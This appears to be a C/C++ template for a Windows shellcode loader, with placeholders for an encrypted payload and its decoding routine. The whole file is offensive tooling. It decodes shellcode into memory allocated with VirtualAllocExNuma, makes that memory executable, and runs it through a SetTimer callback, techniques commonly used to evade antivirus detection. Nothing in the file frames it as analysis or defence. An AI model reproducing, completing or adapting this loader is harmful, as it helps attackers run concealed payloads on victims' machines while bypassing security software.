#include <windows.h>
#include <stdio.h>
#include "base64.h"
#include "syscall.h"



char Ciphertext[] = "<Ciphertext>";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	UINT_PTR dummy = 0;
	MSG msg;

	::SetTimer(NULL, dummy, NULL, (TIMERPROC)addr);

	::GetMessageW(&msg, NULL, 0, 0);
	::DispatchMessageW(&msg);

	return 0;

}